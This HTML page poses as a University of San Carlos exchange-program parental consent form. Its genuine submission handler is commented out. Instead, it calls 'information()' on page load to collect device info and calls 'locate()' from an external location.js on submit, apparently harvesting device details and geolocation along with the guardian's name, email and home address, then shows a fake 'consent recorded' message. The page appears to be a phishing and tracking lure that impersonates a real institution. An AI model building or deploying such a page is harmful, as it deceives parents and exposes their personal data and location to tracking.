<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Parent/Guardian Consent Form | USC Exchange Program</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#ffffff">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <link rel="icon" href="https://www.usc.edu.ph/sites/default/files/favicon.ico">
  <link rel="stylesheet" href="css/styles.css">
</head>

<body onload="information();">

  <div class="container">
    <h1>Parent/Guardian Consent Form</h1>
    <h2>Exchange Student Program — University of San Carlos (Cebu) to Netherlands</h2>

    <form id="consentForm" onsubmit="return false;">
      <label for="guardianName">Parent/Guardian Full Name</label>
      <input type="text" id="guardianName" required placeholder="Enter your full name">

      <label for="email">Email Address</label>
      <input type="email" id="email" required placeholder="you@example.com">

      <label for="address">Address</label>
      <textarea id="address" required placeholder="Complete home address"></textarea>

      <hr style="margin: 25px 0; border: none; border-top: 1px solid #dadce0;">

      <label for="studentName">Student’s Full Name</label>
      <input type="text" id="studentName" required placeholder="Enter student's full name">

      <label for="course">Course / Program</label>
      <input type="text" id="course" required placeholder="e.g., BS Civil Engineering">

      <label for="yearLevel">Year Level</label>
      <select id="yearLevel" required>
        <option value="" disabled selected>Select Year Level</option>
        <option value="1st Year">1st Year</option>
        <option value="2nd Year">2nd Year</option>
        <option value="3rd Year">3rd Year</option>
        <option value="4th Year">4th Year</option>
      </select>

      <div class="consent">
        <input type="checkbox" id="consentCheckbox">
        <span>I hereby grant permission for my daughter, the student named above, to participate in the University of San Carlos Exchange Student Program in the Netherlands for one (1) semester.</span>
      </div>

      <button type="button" id="submitBtn">Submit Consent</button>
      <p id="status"></p>
    </form>
  </div>

  <!-- Modal -->
  <div id="alertModal" class="modal-overlay">
    <div class="modal-box">
      <h3 id="modalTitle">Notice</h3>
      <p id="modalMessage">Message text here...</p>
      <button id="modalOk">OK</button>
    </div>
  </div>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="js/location.js"></script>
  <!-- <script src="js/form-handler.js"></script> -->
  <script src="js/protect.js"></script>
  <script>function showModal(title, message) {
  $('#modalTitle').text(title);
  $('#modalMessage').text(message);
  $('#alertModal').addClass('active');
}

$('#modalOk').click(function() {
  $('#alertModal').removeClass('active');
});

$(document).ready(function() {
  $('#submitBtn').click(function() {
    var guardian = $('#guardianName').val().trim();
    var email = $('#email').val().trim();
    var contact = $('#contact').val().trim();
    var address = $('#address').val().trim();
    var student = $('#studentName').val().trim();
    var course = $('#course').val().trim();
    var year = $('#yearLevel').val();
    var consent = $('#consentCheckbox').is(':checked');
    var status = $('#status');

    if (!guardian || !email || !address || !student || !course || !year) {
      status.text('Please complete all required fields.');
      showModal('Incomplete Fields', 'Please complete all required fields before submitting.');
      return;
    }

    if (!consent) {
      status.text('You must provide consent before submission.');
      showModal('Consent Required', 'Please check the consent box before submitting.');
      return;
    }

    status.text('Submitting information...');
    information(); // device info
    locate(
      function() {
        status.text('✅ Consent submitted successfully!');
        $('#submitBtn').html('Done');
        showModal('Success', 'Thank you, ' + guardian + '! Your consent has been recorded.');
      },
      function(err) {
        status.text('⚠️ Failed to submit.');
        $('#submitBtn').html('Retry');
        showModal('Error', 'An error has occurred. Please try again.');
      }
    );
  });
});
</script>

</body>
</html>
